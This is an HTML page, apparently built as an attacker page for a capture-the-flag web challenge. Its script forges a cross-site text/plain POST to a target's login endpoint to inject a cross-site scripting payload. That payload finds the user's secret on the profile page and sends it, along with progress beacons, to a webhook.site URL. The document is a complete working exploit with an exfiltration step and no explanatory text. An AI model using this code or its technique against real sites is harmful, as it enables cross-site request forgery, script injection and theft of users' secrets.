<!doctype html><html><body>
<script>
const target = "Challenge Link"; //Change This
const webhook = "https://webhook.site/UUID"; //Change This
(new Image()).src = webhook + '?stage=boot';

const payload = `<img src=x onerror="(new Image()).src='${webhook}?stage=xss';
  var t=[...document.querySelectorAll('p')]
    .map(p=>p.textContent)
    .find(t=>t.includes('Your secret'));
  if(t){
    var s=t.split(':').slice(1).join(':').trim();
    (new Image()).src='${webhook}?flag='+encodeURIComponent(s);
  }">`;

const escaped = JSON.stringify(payload).slice(1, -1);
const prefix = '{"username":"' + escaped + '","secret":"x';
const suffix = '"}';

window.open(target + '/profile', 'prof');

const form = document.createElement('form');
form.method = 'POST';
form.action = target + '/login';
form.enctype = 'text/plain';
const input = document.createElement('input');
input.name = prefix;
input.value = suffix;
form.appendChild(input);
document.body.appendChild(form);

setTimeout(() => {
  (new Image()).src = webhook + '?stage=submitted';
  form.submit();
}, 40);
</script>
</body></html>
